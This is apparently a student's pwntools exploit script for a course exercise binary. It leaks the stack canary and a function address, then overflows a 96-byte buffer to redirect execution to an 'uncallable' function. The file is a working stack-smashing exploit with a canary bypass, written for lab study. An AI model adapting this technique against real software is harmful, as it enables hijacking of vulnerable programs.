#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise3/exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

'''
print_hello: 0x1288
uncallable: 0x1269
delta: 31

$rbp - 0x8: 0
$rbp - 0xc: 0
$rbp - 0x14: 0  check_authorization return value
$rbp - 0x1c: print_hello address
$rbp - 0x20: canary
$rbp - 0x80: our buffer (96 chars)
'''
print(ELF(exe).symbols['uncallable'])
print(ELF(exe).symbols['print_hello'])

print(r.recvline())
r.sendline(b'A' * 95)
output1 = r.recvline()
print(output1)
hint = r.recvline()  ### '$CANARY $PRINT_HELLO is not the password\n'
print(hint)
hint = hint[0: (-1) * len(" is not the password\n")]

canary, print_hello_address = hint[:4], hint[4:]
print(canary)
print(print_hello_address)
print(print_hello_address.hex())
print(int(print_hello_address[::-1].hex(), base=16))
uncallable_address = int(print_hello_address[::-1].hex(), base=16) - 31
print(uncallable_address)

padding = b"A" * 96
command = padding + canary + b"A" * 8 + b"A" * (20 + 8) + p64(uncallable_address) + b"\n"

r.sendline(command)
print(r.recvall(timeout=3))

